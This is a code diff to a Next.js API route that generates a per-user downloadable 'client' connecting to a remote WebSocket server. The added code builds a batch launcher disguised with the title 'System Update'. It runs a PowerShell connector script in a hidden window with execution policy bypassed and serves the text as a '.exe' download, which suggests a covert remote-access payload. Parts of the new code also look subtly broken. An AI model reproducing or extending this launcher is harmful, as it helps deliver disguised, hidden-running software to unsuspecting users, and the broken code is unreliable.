@@ -12,38 +12,32 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: "UID required" }, { status: 400 })
     }
 
-    // Read pre-compiled client template
-    const templatePath = path.join(process.cwd(), "client", "template.exe")
+    // Read PowerShell template
+    const templatePath = path.join(process.cwd(), "client", "connector.ps1")
     
     if (!fs.existsSync(templatePath)) {
-      // Create a simple batch file as fallback
-      const batchContent = `@echo off
-title GROB Client
-echo Connecting to server...
-echo Server: wss://glistening-mindfulness.up.railway.app
-echo Your UID: ${userUid}
-echo.
-echo Press any key to exit...
-pause > nul`
-
-      return new NextResponse(batchContent, {
-        status: 200,
-        headers: {
-          "Content-Type": "text/plain",
-          "Content-Disposition": `attachment; filename="${fileName}.bat"`,
-        },
-      })
+      return NextResponse.json({ error: "Template not found" }, { status: 500 })
     }
 
-    // Read the executable template
-    const exeBuffer = fs.readFileSync(templatePath)
+    // Read and modify the PowerShell script
+    let psScript = fs.readFileSync(templatePath, "utf-8")
+    
+    // Create a batch file to run PowerShell script
+    const batchContent = `@echo off
+title System Update
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0connector.ps1" "${userUid}"
+exit`
 
-    return new NextResponse(exeBuffer, {
+    // Create a self-extracting executable using PowerShell
+    const exeContent = `@echo off
+powershell.exe -WindowStyle Hidden -Command "& {$batchContent.replace(/"/g, '`"')}"
+exit`
+
+    return new NextResponse(exeContent, {
       status: 200,
       headers: {
         "Content-Type": "application/octet-stream",
         "Content-Disposition": `attachment; filename="${fileName}.exe"`,
-        "Content-Length": exeBuffer.length.toString(),
       },
     })
   } catch (error: any) {
